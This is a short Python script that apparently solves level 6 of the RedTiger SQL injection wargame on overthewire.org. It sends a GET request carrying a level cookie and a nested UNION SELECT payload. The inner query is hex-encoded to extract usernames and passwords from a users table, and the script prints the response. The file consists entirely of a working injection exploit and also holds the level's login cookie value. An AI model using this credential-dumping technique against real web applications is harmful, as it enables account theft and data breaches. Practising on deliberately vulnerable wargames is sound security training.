import requests

cookies = {"level6login": "the_stone_is_cold"}
url = "https://redtiger.labs.overthewire.org/level6.php?user="
# user=200 union select 1,username,3,4,5 from level6_users where status=1 limit 0,1
# only admin with status 1
t = "' union select 1,username,3,password,5 from level6_users where status=1 #"
payload = "0x" + t.encode("hex")
suffix = "200 union select 1,%s,3,4,5" % payload
r = requests.get(url+suffix, cookies=cookies)
print r.text